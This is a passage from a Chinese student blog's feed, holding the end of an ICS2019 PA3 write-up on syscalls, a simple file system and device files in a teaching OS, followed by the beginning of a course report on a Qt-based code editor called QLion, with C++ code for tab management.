fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lz454jlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-lz454jlmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> SYS_exit: _halt(a[<span class="hljs-number">1</span>]); <span class="hljs-keyword">break</span>;</code></pre></div></div><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211442505567_744_20230601235747183942_216_image-20230515200157973.png" alt="image-20230515200157973"><figcaption aria-hidden="true">image-20230515200157973</figcaption></figure><h3 id="操作系统之上的trm">操作系统之上的TRM</h3><h4 id="标准输出">标准输出</h4><p>根据<code>write</code>的函数声明(不用man，代码里也可以看出来)</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-nw1i4nlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-nw1i4nlmrh9u68"><pre><code class="hljs C++"><span class="hljs-type">int</span> _write(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> count) { <span class="hljs-keyword">return</span> _syscall_(SYS_write, fd, (<span class="hljs-type">intptr_t</span>)buf, count);}</code></pre></div></div><p>在<code>do_syscall()</code>中识别出系统调用号是<code>SYS_write</code>之后,检查<code>fd</code>的值,如果<code>fd</code>是<code>1</code>或<code>2</code>(分别代表<code>stdout</code>和<code>stderr</code>),则将<code>buf</code>为首地址的<code>len</code>字节输出到串口(使用<code>_putc()</code>即可).最后还要设置正确的返回值,</p><p>这一步就要man一下看看了。返回值的含义:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211443525293_370_20230601235751693727_656_image-20230515203231772.png" alt="image-20230515203231772"><figcaption aria-hidden="true">image-20230515203231772</figcaption></figure><p>因此可做如下实现(<code>do_syscall</code>中):</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-g4eqnmlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-g4eqnmlmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> SYS_write:{  <span class="hljs-type">int</span> fd = (<span class="hljs-type">int</span>)a[<span class="hljs-number">1</span>];  <span class="hljs-type">char</span> *buf = (<span class="hljs-type">char</span> *)a[<span class="hljs-number">2</span>];  <span class="hljs-type">size_t</span> len = (<span class="hljs-type">size_t</span>)a[<span class="hljs-number">3</span>];  <span class="hljs-keyword">if</span>(fd==<span class="hljs-number">1</span>||fd==<span class="hljs-number">2</span>){    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;len;++i,++buf)      _putc(*buf);    c-&gt;GPRx=len;  }  <span class="hljs-keyword">else</span>{    c-&gt;GPRx=<span class="hljs-number">-1</span>;  }        <span class="hljs-keyword">break</span>;}</code></pre></div></div><p>不要忘了加<code>break</code>。。。。</p><p>好了，我们成功运行了永不停息的hello world。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211444501936_479_20230601235754766515_943_image-20230515203537734.png" alt="image-20230515203537734"><figcaption aria-hidden="true">image-20230515203537734</figcaption></figure><h4 id="堆区管理">堆区管理</h4><p><code>_sbrk()</code>实现:</p><ol type="1"><li>program break一开始的位置位于<code>_end</code></li><li>被调用时, 根据记录的program break位置和参数<code>increment</code>,计算出新program break</li><li>通过<code>SYS_brk</code>系统调用来让操作系统设置新program break</li><li>若<code>SYS_brk</code>系统调用成功, 该系统调用会返回<code>0</code>,此时更新之前记录的program break的位置, 并将旧programbreak的位置作为<code>_sbrk()</code>的返回值返回</li><li>若该系统调用失败, <code>_sbrk()</code>会返回<code>-1</code></li></ol><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-lplbq5lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-lplbq5lmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> _end;...<span class="hljs-type">static</span> <span class="hljs-type">intptr_t</span> program_break=(<span class="hljs-type">intptr_t</span>)&amp;_end;<span class="hljs-type">void</span> *_sbrk(<span class="hljs-type">intptr_t</span> increment) {  <span class="hljs-type">intptr_t</span> prev_break=program_break;  <span class="hljs-keyword">if</span>(_syscall_(SYS_brk,program_break+increment,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">0</span>){    program_break+=increment;  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *)prev_break;  }  <span class="hljs-keyword">else</span>{    <span class="hljs-built_in">return</span> (<span class="hljs-type">void</span> *)<span class="hljs-number">-1</span>;  }}</code></pre></div></div><p>暂时只有单道应用程序，认为堆区分配总能成功:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ag8h2wlmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-ag8h2wlmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">case</span> SYS_brk:  c-&gt;GPRx = <span class="hljs-number">0</span>;  <span class="hljs-keyword">break</span>;</code></pre></div></div><p>输出能够走缓冲区了:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211445507441_346_20230601235802225361_544_image-20230515211709483.png" alt="image-20230515211709483"><figcaption aria-hidden="true">image-20230515211709483</figcaption></figure><h3 id="必答题-1">必答题</h3><h6 id="hello程序是什么-它从而何来-要到哪里去它能吃吗">hello程序是什么,它从而何来, 要到哪里去，<del>它能吃吗</del></h6><h2 id="三阶段">三阶段</h2><h3 id="让loader使用文件">让loader使用文件</h3><p>实验指导书中说，需要先实现<code>fs_open()</code>,<code>fs_read()</code>和<code>fs_close()</code>,这样就可以在loader中使用文件名来指定加载的程序了。但是按照指导书的指示先实现了这三个指令，仿照原来的loader把所有的<code>randisk_read</code>改成<code>fs_read</code>后却一直内存超限。一想，<code>fs_read</code>只能从当前的open_offset开始读啊，读pheader时我们要从<code>elf_header.e_phoff</code>开始读。后面读每个块的时候也是类似。所以<code>fs_lseek</code>还是必不可少。当时实现loader的细节有些模糊了，所以干了蠢事。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-x71woulmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-x71woulmrh9u68"><pre><code class="hljs C++">Elf_Ehdr elf_header;<span class="hljs-type">int</span> fd = <span class="hljs-built_in">fs_open</span>(filename,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<span class="hljs-built_in">Log</span>(<span class="hljs-string">"filename: %s, fd: %d"</span>, filename, fd);<span class="hljs-type">size_t</span> read_len = <span class="hljs-built_in">fs_read</span>(fd, &amp;elf_header, <span class="hljs-built_in">sizeof</span>(Elf_Ehdr));<span class="hljs-built_in">assert</span>(read_len == <span class="hljs-built_in">sizeof</span>(Elf_Ehdr));Elf_Phdr elf_program_header[elf_header.e_phnum];<span class="hljs-built_in">fs_lseek</span>(fd, elf_header.e_phoff, SEEK_SET);read_len = <span class="hljs-built_in">fs_read</span>(fd, elf_program_header, <span class="hljs-built_in">sizeof</span>(Elf_Phdr) * elf_header.e_phnum);<span class="hljs-built_in">assert</span>(read_len == <span class="hljs-built_in">sizeof</span>(Elf_Phdr) * elf_header.e_phnum);<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; elf_header.e_phnum; i++){  <span class="hljs-comment">// only load PT_LOAD type</span>  <span class="hljs-keyword">if</span> (elf_program_header[i].p_type == PT_LOAD)  {    <span class="hljs-built_in">fs_lseek</span>(fd, elf_program_header[i].p_offset, SEEK_SET);    read_len=<span class="hljs-built_in">fs_read</span>(fd, (<span class="hljs-type">void</span> *)elf_program_header[i].p_vaddr, elf_program_header[i].p_memsz);    <span class="hljs-built_in">assert</span>(read_len==elf_program_header[i].p_memsz);    <span class="hljs-built_in">memset</span>((<span class="hljs-type">void</span> *)(elf_program_header[i].p_vaddr + elf_program_header[i].p_filesz), <span class="hljs-number">0</span>, elf_program_header[i].p_memsz - elf_program_header[i].p_filesz);  }}<span class="hljs-built_in">fs_close</span>(fd);<span class="hljs-keyword">return</span> elf_header.e_entry;</code></pre></div></div><p>另外，关于如何加载新的文件也找了一些时间，在这里:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-w8q1bblmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-w8q1bblmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init_proc</span><span class="hljs-params">()</span> </span>{  switch_boot_pcb();  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"Initializing processes..."</span>);  <span class="hljs-type">char</span> filename[] = <span class="hljs-string">"/bin/events"</span>;  <span class="hljs-comment">// load program here</span>  <span class="hljs-built_in">naive_uload</span>(<span class="hljs-literal">NULL</span>, filename);}</code></pre></div></div><h3 id="实现完整的文件系统">实现完整的文件系统</h3><p>另外几个api的实现较为简单(虽然中间<code>fs_write</code>还是写错了一次)，类似于PA2中的<code>scanf</code>等实现，按照其原本的含义<code>man</code>一下对照实现即可。代码不再赘述。</p><p>最后，还要注册事件，还有<strong>要在<code>navy-apps/libs/libos/src/nanos.c</code>里调用系统调用接口</strong>，当时实现<code>sbrk</code>的时候说了，文件系统没有说，就忘了，还一直疑惑明明实现的没问题就是打不开文件。。。</p><p>单元测试成功:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211446786000_613_20230601235805595522_997_image-20230517093932147.png" alt="image-20230517093932147"><figcaption aria-hidden="true">image-20230517093932147</figcaption></figure><h3 id="操作系统之上的ioe">操作系统之上的IOE</h3><h4 id="串口">串口</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-qs2mcslmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-qs2mcslmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">serial_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> len)</span> </span>{  <span class="hljs-comment">// return 0;</span>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++)  {    _putc(((<span class="hljs-type">char</span> *)buf)[i]);  }  <span class="hljs-keyword">return</span> len;}</code></pre></div></div><p>这时候读写文件就不需要对标准输入输出特判了，如:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-x8dp4klmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-x8dp4klmrh9u68"><pre><code class="hljs C++"><span class="hljs-keyword">if</span> (fd &lt;= <span class="hljs-number">2</span>){  <span class="hljs-built_in">Log</span>(<span class="hljs-string">"ignore read from %d"</span>, fd);  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre></div></div><h4 id="设备">设备</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-iy36r3lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-iy36r3lmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">events_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> len)</span></span><span class="hljs-function"></span>{  <span class="hljs-comment">//  return 0;</span>  <span class="hljs-type">int</span> key = <span class="hljs-built_in">read_key</span>();  <span class="hljs-keyword">if</span> (key != _KEY_NONE) <span class="hljs-comment">// key event</span>  {    <span class="hljs-comment">// Log("key event");</span>    <span class="hljs-keyword">if</span> (key &amp; <span class="hljs-number">0x8000</span>)    {      <span class="hljs-comment">// if (key&gt;=0x8002&amp;&amp;key&lt;=0x8004) change_gcb(key-0x8001);</span>      <span class="hljs-built_in">sprintf</span>((<span class="hljs-type">char</span> *)buf, <span class="hljs-string">"kd %s\n"</span>, keyname[key &amp; <span class="hljs-number">0x7fff</span>]);    }    <span class="hljs-keyword">else</span>    {      <span class="hljs-built_in">sprintf</span>((<span class="hljs-type">char</span> *)buf, <span class="hljs-string">"ku %s\n"</span>, keyname[key &amp; <span class="hljs-number">0x7fff</span>]);    }  }  <span class="hljs-keyword">else</span> <span class="hljs-comment">// time event</span>  {    <span class="hljs-comment">// if (now%1000==0) Log("time event");</span>    <span class="hljs-built_in">sprintf</span>((<span class="hljs-type">char</span> *)buf, <span class="hljs-string">"t %d\n"</span>, <span class="hljs-built_in">uptime</span>());  }  <span class="hljs-keyword">return</span> <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span> *)buf);}</code></pre></div></div><p>这一部分一开始直接把函数参数里的<code>len</code>给返回了，就会一直报<code>receive event</code>。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211447927853_539_20230601235809798522_812_image-20230517120535802.png" alt="image-20230517120535802"><figcaption aria-hidden="true">image-20230517120535802</figcaption></figure><p>更新文件描述表:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-y6a6iplmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-y6a6iplmrh9u68"><pre><code class="hljs C++"><span class="hljs-type">static</span> Finfo file_table[] __attribute__((used)) = {    {<span class="hljs-string">"stdin"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, invalid_read, invalid_write},    {<span class="hljs-string">"stdout"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, invalid_read, serial_write},    {<span class="hljs-string">"stderr"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, invalid_read, serial_write},    {<span class="hljs-string">"/dev/events"</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, events_read, invalid_write},<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">"files.h"</span></span>};</code></pre></div></div><p>正常工作:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211449189955_553_20230601235812963148_940_image-20230517120133366.png" alt="image-20230517120133366"><figcaption aria-hidden="true">image-20230517120133366</figcaption></figure><h4 id="vga">VGA</h4><p>这一部分指导书上说的是非常贴心，每一步该干什么都非常明确，真是非常难得。</p><p>其中主要是<code>fb_write</code>需要额外思索一下，其他的都是比较常规的流程。</p><p>另外注意VGA的一个像素占4bit。</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-elp1u7lmrh9u68"></i><span>C++</span><div class="collapse show" id="collapse-elp1u7lmrh9u68"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">fb_write</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> offset, <span class="hljs-type">size_t</span> len)</span></span><span class="hljs-function"></span>{<span class="hljs-type">int</span> width=<span class="hljs-built_in">screen_width</span>();<span class="hljs-type">int</span> x=(offset/<span class="hljs-number">4</span>)%width,y=(offset/<span class="hljs-number">4</span>)/width;<span class="hljs-built_in">draw_rect</span>((<span class="hljs-type">uint32_t</span>*)buf,x,y,len/<span class="hljs-number">4</span>,<span class="hljs-number">1</span>);<span class="hljs-keyword">return</span> len;}</code></pre></div></div><p>这一步也遇到了跑不起来的问题，不过补充了缺少的指令也成功运行起来了:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211453140815_191_20230601235817127402_182_image-20230517154453440.png" alt="image-20230517154453440"><figcaption aria-hidden="true">image-20230517154453440</figcaption></figure><h3 id="运行仙剑奇侠传">运行仙剑奇侠传</h3><p>上一个vga实现<code>movsb</code>，紧接着实现<code>movswd</code>，将<strong>编译好</strong>的<code>pal</code>放到对应文件夹中，就可以运行了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211456492222_910_20230601235821779651_126_image-20230517164713444.png" alt="image-20230517164713444"><figcaption aria-hidden="true">image-20230517164713444</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211458145084_544_20230601235826834827_871_image-20230517164759642.png" alt="image-20230517164759642"><figcaption aria-hidden="true">image-20230517164759642</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211459457348_581_20230601235833556085_425_image-20230517170756063.png" alt="image-20230517170756063"><figcaption aria-hidden="true">image-20230517170756063</figcaption></figure><h3 id="展示批处理系统">展示批处理系统</h3><p>这是ics2019新加的一部分，实现起来非常简单，就是按照系统调用的逻辑，退出一个程序后把这个菜单程序再load进来。虽然简单，但是足够体现“操作系统的目的就是为了支持多道程序运行”的含义了。来看看我们现在都能支持哪些程序运行了。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211500565292_239_20230601235836104923_738_image-20230517170521104.png" alt="image-20230517170521104"><figcaption aria-hidden="true">image-20230517170521104</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211502331847_228_20230601235838881129_188_image-20230517170629690.png" alt="image-20230517170629690"><figcaption aria-hidden="true">image-20230517170629690</figcaption></figure><h3 id="必答题-2">必答题</h3><h4 id="仙剑奇侠传究竟如何运行">仙剑奇侠传究竟如何运行</h4><h5 id="读出仙鹤信息">读出仙鹤信息</h5><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211503669868_404_20230601235842381091_613_image-20230517174652184.png" alt="image-20230517174652184"><figcaption aria-hidden="true">image-20230517174652184</figcaption></figure><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211504698736_903_20230601235844474454_763_image-20230517174823390.png" alt="image-20230517174823390"><figcaption aria-hidden="true">image-20230517174823390</figcaption></figure><p>可以看到打开<code>mgo.mkf</code>调用了库函数<code>fopen</code></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211505735790_671_20230601235849337123_726_image-20230517174841335.png" alt="image-20230517174841335"><figcaption aria-hidden="true">image-20230517174841335</figcaption></figure><p>播放暂停时还会调用</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211506634831_668_20230601235852617171_673_image-20230517175011723.png" alt="image-20230517175011723"><figcaption aria-hidden="true">image-20230517175011723</figcaption></figure><p>也是直接调用库函数。</p><p>这一部分的过程<a href="https://www.cnblogs.com/TKK-YLF/articles/16737509.html">网上</a>有一张图画的非常清晰，就不班门弄斧了:</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6ics2019_PA3/20230828211507894301_491_20230601235857281415_765_image-20230517180110224.png" alt="image-20230517180110224"><figcaption aria-hidden="true">image-20230517180110224</figcaption></figure><h5 id="更新位置">更新位置</h5><p>这一部分如指导书所说，主要是<code>PAL_SplashScreen()</code>完成的。</p><p>首先<code>Allocate all the needed memory at once for simplification</code>，调用的是库中的<code>calloc</code>。</p><p>然后初始化屏幕</p><p><code>VIDEO_CreateCompatibleSurface -&gt; VIDEO_CreateCompatibleSizedSurface -&gt; SDL_CreateRGBSurface</code></p><p>读图片，获取仙鹤位置。这一部分前面已经分析了。</p><p>播放背景音乐。目前还没实现。</p><p>响应键盘事件，画屏幕</p><ul><li>背景：VIDEO_CopySurface -&gt; SDL_BlitSurface</li><li>仙鹤 &amp; 标题：一些特殊的方法，最后都归结为更新像素信息</li><li>VIDEO_UpdateScreen -&gt; (SDL_SoftStretch) / SDL_FillRect /SDL_UpdateRect</li><li>SDL_UpdateRect -&gt; NDL_DrawRect -&gt; open and write<code>/dev/fb</code></li></ul><p>最后通过<code>PAL_ProcessEvent</code>触发系统调用。这就是前面必答题中的内容了。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>系统设计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QLion代码编辑器</title>
    <link href="/posts/45065/"/>
    <url>/posts/45065/</url>
    
    <content type="html"><![CDATA[<h1 id="高级语言程序设计实验报告">高级语言程序设计实验报告</h1><p>南开大学 计算机学院 田佳业 2013599 1013班</p><p>2023年5月15日</p><h2 id="作业题目">作业题目</h2><p>代码编辑器QLion</p><h2 id="开发软件">开发软件</h2><p>Qt 6.4.2</p><p>CLion 2023.1.2</p><p>Qt Designer</p><h2 id="课题要求">课题要求</h2><ul><li>采用C++语言编写</li><li>采用面向对象的设计理念</li></ul><h2 id="项目计划完成情况">项目计划完成情况</h2><ul class="task-list"><li><input type="checkbox" checked="">CLion界面风格</li><li><input type="checkbox" checked="">文本编辑器基本功能</li><li><input type="checkbox" checked="">代码高亮</li><li><input type="checkbox" checked="">文件目录树</li><li><input type="checkbox" checked="">查找替换</li><li><input type="checkbox" checked="">快速注释</li><li><input type="checkbox" checked="">Cmake项目运行</li><li><input type="checkbox" checked="">主题配置</li><li><input type="checkbox" checked="">括号补全和自动缩进</li></ul><p>还有好多其他作业要做呜呜呜</p><p>Update:考试周临近，主播溜大了</p><p><a href="https://www.bilibili.com/video/BV12m4y1b7SN">BiliBili视频演示</a></p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210624849799_291_20230526120414661830_608_image-20230526113432166.png" alt="image-20230526113432166"><figcaption aria-hidden="true">image-20230526113432166</figcaption></figure><h2 id="项目结构">项目结构</h2><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210625984819_432_20230526120417791162_622_20230515214325856307_437_image-20230514204456321.png" alt="image-20230514204456321"><figcaption aria-hidden="true">image-20230514204456321</figcaption></figure><h2 id="主要流程">主要流程</h2><p>由于整个项目较为复杂，下面仅简要介绍重要部分的实现思路，有一些实现细节可能难免不能面面俱到。</p><h3 id="界面风格">界面风格</h3><p>使用QT提供<code>fusion</code>风格，并结合使用<code>platte</code>和<code>stylesheet</code>完成暗黑风格的绘制。在<a href="https://gist.github.com/QuantumCD/6245215">此代码片段</a>基础上进行了微调。</p><h3 id="文本编辑器">文本编辑器</h3><p>文本编辑器部分主要的难点在于tab的有效管理。</p><h4 id="添加标签页">添加标签页</h4><p>添加标签页有两种情况，一种是新建的没有与文件关联的标签页，另一种是通过文件打开的标签页。</p><p>这一部分的主要亮点:</p><ul><li><p>实现了类似VSCode中打开同名但不同路径的文件时，可以自动通过显示文件路径来区分来自不同路径的文件。</p></li><li><p>注意到VSCode新建若干个未与文件关联的标签页时，会选取当前可用的最小标签页。如下图所示新建标签页会命名为<code>Untitled-2</code>。在这个项目中也复现了这样的设计。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/QLion%E4%BB%A3%E7%A0%81%E7%BC%96%E8%BE%91%E5%99%A8/20230828210628831543_906_20230526120422247570_581_20230515214327370668_329_image-20230514201910114.png" alt="image-20230514201910114"><figcaption aria-hidden="true">image-20230514201910114</figcaption></figure></li></ul><p>第一点的实现可以逐个标签页进行遍历，也可以采用字典树等方式进行优化。在这个项目中采用了较容易实现的遍历方式。</p><p>第二点的实现使用了<code>unordered_set</code>存储了当前存在的未命名标签页，逐ID比对。</p><p>为了便于通过路径快速寻找到对应的标签页，可以将<code>&lt;filePath，tabINdex&gt;</code>的对应关系存到一个<code>unordered_map</code>中。哈希表可以实现近似<code>O(1)</code>的查找替换的复杂度。</p><p>下面是添加标签页的部分代码，有两个重载函数，分别对应了是否关联文件的标签页。</p><p>关联文件的标签页:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-nu4hkflmrh9u65"></i><span>C++</span><div class="collapse show" id="collapse-nu4hkflmrh9u65"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QLionTabWidget::addNewTab</span><span class="hljs-params">(<span class="hljs-type">const</span> QString &amp;text, <span class="hljs-type">const</span> QString &amp;filePath)</span> </span>{    <span class="hljs-keyword">if</span> (mainWindow) {        <span class="hljs-type">bool</span> needToDistinguish = <span class="hljs-literal">false</span>;        QString fileName = <span class="hljs-built_in">QFileInfo</span>(filePath).<span class="hljs-built_in">fileName</span>();        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">count</span>(); i++) {            QString filePathOfCurrentTab = <span class="hljs-built_in">getCodePage</span>(i)-&gt;<span class="hljs-built_in">getFilePath</span>();            <span class="hljs-keyword">if</span> (filePathOfCurrentTab == filePath) {                <span class="hljs-built_in">setCurrentIndex</span>(i);                <span class="hljs-keyword">return</span>;            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">QFileInfo</span>(filePathOfCurrentTab).<span class="hljs-built_in">fileName</span>() == fileName) {                <span class="hljs-built_in">setTabText</span>(i, filePathOfCurrentTab);                needToDistinguish = <span class="hljs-literal">true</span>;            }        }        <span class="hljs-keyword">if</span> (needToDistinguish) {            fileName = filePath;        }        <span class="hljs-comment">// if the text is too long, do not init Highlighter</span>        <span class="hljs-keyword">if</span> (text.<span class="hljs-built_in">length</span>() &gt; <span class="hljs-number">10000</span>) {            <span class="hljs-built_in">addTab</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">QLionCodePage</span>(<span class="hljs-keyword">this</span>, <span class="hljs-literal">false</span>), fileName);        } <span class="hljs-keyword">else</span> {            <span class="hljs-built_in">addTab</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">QLionCodePage</span>(<span class="hljs-keyword">this</span>), fileName);        }        usingFilePath[filePath] = <span class="hljs-built_in">count</span>() - <span class="hljs-number">1</span>;        <span class="hljs-built_in">setCurrentIndex</span>(<span class="hljs-built_in">count</span>() - <span class="hljs-number">1</span>);        <span class="hljs-keyword">auto</span> *codePage = <span class="hljs-built_in">getCurrentCodePage</span>();        <span class="hljs-comment">// do not forget to set the parentTabWidget</span>        <span class="hljs-built_in">getCurrentCodePage</span>()-&gt;<span class="hljs-built_in">setParentTabWidget</span>(<span class="hljs-keyword">this</span>);        codePage-&gt;<span class="hljs-built_in">setFilePath</span>(filePath);        codePage-&gt;<span class="hljs-built_in">setPlainText</span>(text);    }}</code></pre></div></div><p>由于文字较长时代码高亮会有卡顿，因此当大于一定长度的时候取消高亮。现在的编辑器如VSCode也是这么做的。</p><p>新建的标签页</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-09on6mlmrh9u65"></i><span>C++</span><div class="collapse show" id="collapse-09on6mlmrh9u65"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">QLionTabWidget::addNewTab</span><span class="hljs-params">()</span> </span>{    <span class="hljs-keyword">if</span> (mainWindow) {        <span class="hljs-comment">// get the minimum unused untitledID from the set</span>        <span class="hljs-type">int</span> newID = <span class="hljs-number">1</span>;        <span class="hljs-comment">// it will iterate at most size() times</span>        <span class="hljs-keyword">while</span> (usingUntitledID.<span class="hljs-built_in">count</span>(newID)) {            newID++;        }        usingUntitledID.<span class="hljs-built_in">insert</span>(newID);        QString title = <span class="hljs-string">"Untitled-"</span> + QString::<span class="hljs-built_in">number</span>(newID);        <span class="hljs-built_in">addTab</span>(<span class="hljs-keyword">new</span> <span class="hljs-built_in">QLionCodePage</span>(<span class="hljs-keyword">this</span>), title);        <span class="hljs-built_in">setCurrentIndex</span>(<span class="hljs-built_in">count</span>() - <span class="hljs-number">1</span>);        QLionCodePage *currentCodePage = <span class="hljs-built_in">getCurrentCodePage</span>();        currentCodePage-&gt;<span class="hljs-built_in">setParentTabWidget</span>(<span class="hljs-keyword">this</span>);        